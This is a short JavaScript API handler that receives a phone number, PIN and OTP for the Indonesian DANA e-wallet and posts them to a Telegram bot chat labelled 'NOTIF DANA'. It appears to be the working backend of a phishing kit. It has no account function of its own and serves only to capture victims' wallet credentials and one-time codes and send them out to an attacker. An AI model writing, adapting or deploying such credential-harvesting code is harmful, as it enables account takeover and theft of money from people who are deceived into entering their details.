export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { nomor, pin, otp } = req.body;

  const token = process.env.BOT_TOKEN;
  const chatId = process.env.CHAT_ID;

  const text = `
NOTIF DANA
━━━━━━━━━━━━━━
Nomor: ${nomor}
PIN: ${pin || '-'}
OTP: ${otp || '-'}
━━━━━━━━━━━━━━
`;

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text
      })
    });

    res.status(200).json({ status: 'success' });
  } catch (err) {
    res.status(500).json({ error: 'gagal kirim' });
  }
}
